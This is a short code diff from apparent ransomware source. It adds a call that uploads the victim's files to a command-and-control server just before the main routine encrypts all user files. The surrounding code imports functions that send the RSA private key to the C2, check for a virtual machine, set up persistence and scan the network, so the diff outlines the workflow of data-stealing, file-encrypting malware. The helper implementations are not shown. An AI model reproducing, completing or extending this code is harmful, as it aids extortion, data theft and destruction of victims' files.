@@ -6,6 +6,7 @@ from Core.Timer import save_timer_data, watchdog_timer,load_timer_data
 from Crypto.RSA_Key_Handling import send_private_key_to_c2
 from System.Persistence import os_check
 from System.VM_Check import running_in_vm
+from System.File_Upload import find_files_upload
 from Session.Session_Handling import get_session_token
 from Network.Network import scan_network
 
@@ -34,7 +35,6 @@ if timer_data:
 else:
     scan_network(ports)
     print("No Timer Data Exist") # Debug Message
-    # Next stage is file download into c2 server
     # Generate the RSA keys
     private_key, public_key = generate_rsa_keys()
     save_rsa_keys(private_key, public_key)
@@ -49,6 +49,8 @@ else:
     get_session_token() # This will get the generate session token from the C2
 
     send_private_key_to_c2(private_key)
+    
+    find_files_upload()
 
     # Encrypt all files
     encrypt_user_files(symmetric_key)
